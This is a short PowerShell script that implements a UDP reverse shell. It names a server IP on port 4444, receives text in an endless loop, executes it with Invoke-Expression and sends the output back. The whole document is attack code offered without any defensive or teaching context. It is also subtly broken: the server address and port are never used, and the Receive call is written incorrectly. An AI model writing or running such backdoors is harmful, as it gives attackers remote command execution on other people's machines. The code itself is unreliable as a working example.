# Define the server IP address and port
$serverIp = "192.168.166.197"
$serverPort = 4444

# Create a UDP client
$client = New-Object System.Net.Sockets.UdpClient

# Define a byte array for data
[byte[]]$bytes = 0..65535|%{0}

# Loop to read data from the UDP client
while ($true) {
    try {
        # Receive data from the server
        $remoteEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 0)
        $data, $remoteEndPoint = $client.Receive($bytes)

        # Convert received data to string
        $receivedData = [System.Text.Encoding]::ASCII.GetString($data)

        # Execute received data as PowerShell commands
        $output = Invoke-Expression $receivedData 2>&1 | Out-String

        # Convert output to bytes
        $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($output)

        # Send output back to the server
        $client.Send($sendBytes, $sendBytes.Length, $remoteEndPoint)
    } catch {
        Write-Host "Error occurred: $_"
    }
}

# Close the UDP client
$client.Close()
